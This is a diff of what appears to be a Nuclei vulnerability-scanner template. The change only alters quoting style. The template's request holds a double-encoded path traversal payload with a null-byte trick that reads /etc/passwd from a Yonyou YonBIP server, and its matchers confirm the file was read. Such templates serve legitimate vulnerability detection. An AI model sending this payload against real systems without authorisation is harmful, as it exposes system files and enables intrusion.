@@ -17,13 +17,13 @@ info:
 http:
   - method: GET
     path:
-      - '{{BaseURL}}/iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js'
+      - "{{BaseURL}}/iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js"
 
     matchers:
       - type: dsl
         dsl:
           - "regex('root:.*:0:0:', body)"
           - 'contains(content_type, "application/javascript")'
-          - 'status_code == 200'
+          - "status_code == 200"
         condition: and
 
